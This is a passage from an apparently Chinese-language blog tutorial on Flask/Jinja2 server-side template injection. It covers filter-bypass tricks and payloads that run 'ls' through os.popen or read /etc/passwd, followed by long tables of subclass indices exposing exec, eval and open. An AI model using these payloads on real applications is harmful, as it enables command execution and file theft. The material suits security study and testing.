<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>如果没用过滤引号,使用反转,或者各种拼接绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__snitliub__&#x27;</span>[::<span class="number">-1</span>]][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>[::<span class="number">-1</span>]][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>第二种绕过过滤关键字的办法即使用request对象：<br><strong>flask获取参数方式：</strong></p>
<p>request.form.get(“key”, type=str, default=None) 获取表单数据</p>
<p>request.args.get(“key”) 获取get请求参数</p>
<p>request.values.get(“key”) 获取所有参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;&quot;</span>.__getattribute__(request.args.a)&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>

<p>第三种是寻找其原生函数</p>
<h3 id="过滤点"><a href="#过滤点" class="headerlink" title="过滤点"></a>过滤点</h3><p>在python中，可用以下表示法可用于访问对象的属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&quot;__class__&quot;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;getattr(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以通过<code>[]</code>，<code>|attr()</code>，<code>getattr()</code>来绕过点</p>
<h2 id="常用语句："><a href="#常用语句：" class="headerlink" title="常用语句："></a>常用语句：</h2><p>任意文件读取:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="读取到class后所指向的可以被继承的函数小结"><a href="#读取到class后所指向的可以被继承的函数小结" class="headerlink" title="读取到class后所指向的可以被继承的函数小结"></a>读取到class后所指向的可以被继承的函数小结</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3的</span><br><span class="line">75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __builtins__ None</span><br><span class="line">75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ None</span><br><span class="line">75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; sys None</span><br><span class="line">76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __builtins__ None</span><br><span class="line">76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ None</span><br><span class="line">76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; sys None</span><br><span class="line">77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __builtins__ None</span><br><span class="line">77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ None</span><br><span class="line">77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; sys None</span><br><span class="line">78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __builtins__ None</span><br><span class="line">78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ None</span><br><span class="line">78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; sys None</span><br><span class="line">79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __builtins__ None</span><br><span class="line">79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ None</span><br><span class="line">79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; sys None</span><br><span class="line">91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __builtins__ None</span><br><span class="line">91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; sys None</span><br><span class="line">92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __builtins__ None</span><br><span class="line">92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; sys None</span><br><span class="line">93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __builtins__ None</span><br><span class="line">93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; sys None</span><br><span class="line">95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __builtins__ None</span><br><span class="line">95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; sys None</span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __builtins__ None</span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; sys None</span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None</span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __builtins__ None</span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; sys None</span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None</span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __builtins__ None</span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; sys None</span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None</span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __builtins__ None</span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; sys None</span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None</span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; __builtins__ None</span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; sys None</span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; open None</span><br><span class="line">129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __builtins__ None</span><br><span class="line">129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; sys None</span><br><span class="line">130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __builtins__ None</span><br><span class="line">130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; sys None</span><br><span class="line">137 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __builtins__ None</span><br><span class="line">138 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __builtins__ None</span><br><span class="line">139 &lt;class &#39;warnings.WarningMessage&#39;&gt; __builtins__ None</span><br><span class="line">139 &lt;class &#39;warnings.WarningMessage&#39;&gt; sys None</span><br><span class="line">140 &lt;class &#39;warnings.catch_warnings&#39;&gt; __builtins__ None</span><br><span class="line">140 &lt;class &#39;warnings.catch_warnings&#39;&gt; sys None</span><br><span class="line">167 &lt;class &#39;reprlib.Repr&#39;&gt; __builtins__ None</span><br><span class="line">174 &lt;class &#39;functools.partialmethod&#39;&gt; __builtins__ None</span><br><span class="line">176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __builtins__ None</span><br><span class="line">176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; sys None</span><br><span class="line">177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __builtins__ None</span><br><span class="line">177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; sys None</span><br><span class="line">----------3-----------</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; eval</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; compile</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__</span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; eval</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; compile</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__</span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; eval</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; compile</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__</span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; eval</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; compile</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__</span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; eval</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; compile</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__</span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; eval</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; compile</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __import__</span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; eval</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; compile</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __import__</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; eval</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; compile</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __import__</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; eval</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; compile</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __import__</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; eval</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; compile</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __import__</span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open</span><br><span class="line">103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; eval</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; compile</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __import__</span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open</span><br><span class="line">104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; eval</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; compile</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __import__</span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open</span><br><span class="line">105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; eval</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; compile</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __import__</span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open</span><br><span class="line">106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open</span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec</span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; file</span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; open</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; eval</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; compile</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; __import__</span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; open</span><br><span class="line">128 11 &lt;class &#39;os._wrap_close&#39;&gt; open</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; eval</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; compile</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __import__</span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; eval</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; compile</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __import__</span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; eval</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; compile</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __import__</span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; eval</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; compile</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __import__</span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; eval</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; compile</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; __import__</span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; eval</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; compile</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; __import__</span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; eval</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; compile</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; __import__</span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; eval</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; compile</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; __import__</span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; eval</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; compile</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __import__</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; eval</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; compile</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __import__</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open</span><br><span class="line">----------4-----------</span><br><span class="line">140 exec</span><br><span class="line">140 eval</span><br><span class="line">140 compile</span><br><span class="line">140 __import__</span><br><span class="line">140 open</span><br><span class="line">筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</span><br><span class="line"></span><br><span class="line">----------2-----------                                      </span><br><span class="line">103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None           </span><br><span class="line">104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None           </span><br><span class="line">105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None           </span><br><span class="line">106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None                </span><br><span class="line">128 &lt;class &#39;os._wrap_close&#39;&gt; open None                      </span><br><span class="line">----------3-----------                                      </span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open           </span><br><span class="line">75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec           </span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open      </span><br><span class="line">76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec      </span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open    </span><br><span class="line">77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec    </span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open     </span><br><span class="line">78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec     </span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open            </span><br><span class="line">79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec            </span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open   </span><br><span class="line">91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec   </span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open</span><br><span class="line">92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open</span><br><span class="line">93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec</span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open   </span><br><span class="line">95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec   </span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open              </span><br><span class="line">103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec              </span><br><span class="line">103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open             </span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open              </span><br><span class="line">104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec              </span><br><span class="line">104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open             </span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open              </span><br><span class="line">105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec              </span><br><span class="line">105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open             </span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                   </span><br><span class="line">106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec                   </span><br><span class="line">106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                  </span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; open                         </span><br><span class="line">128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec                         </span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; open                         </span><br><span class="line">128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec                         </span><br><span class="line">128 11 &lt;class &#39;os._wrap_close&#39;&gt; open                        </span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open                  </span><br><span class="line">129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec                  </span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open                 </span><br><span class="line">130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec                 </span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open            </span><br><span class="line">137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec            </span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open                </span><br><span class="line">138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec                </span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open                </span><br><span class="line">139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec                </span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open                </span><br><span class="line">140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec                </span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open                           </span><br><span class="line">167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec                           </span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open                </span><br><span class="line">174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec                </span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open</span><br><span class="line">176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec</span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open              </span><br><span class="line">177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec              </span><br><span class="line">----------4-----------                                      </span><br><span class="line">140 open                                                    </span><br><span class="line">140 exec      </span><br></pre></td></tr></table></figure>

<h4 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------1-----------</span><br><span class="line">(40, &#39;file&#39;)</span><br><span class="line">----------2-----------</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])</span><br><span class="line">(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])</span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)</span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__builtins__&#39;, None)</span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;sys&#39;, None)</span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)</span><br><span class="line">----------3-----------</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(59, 13, 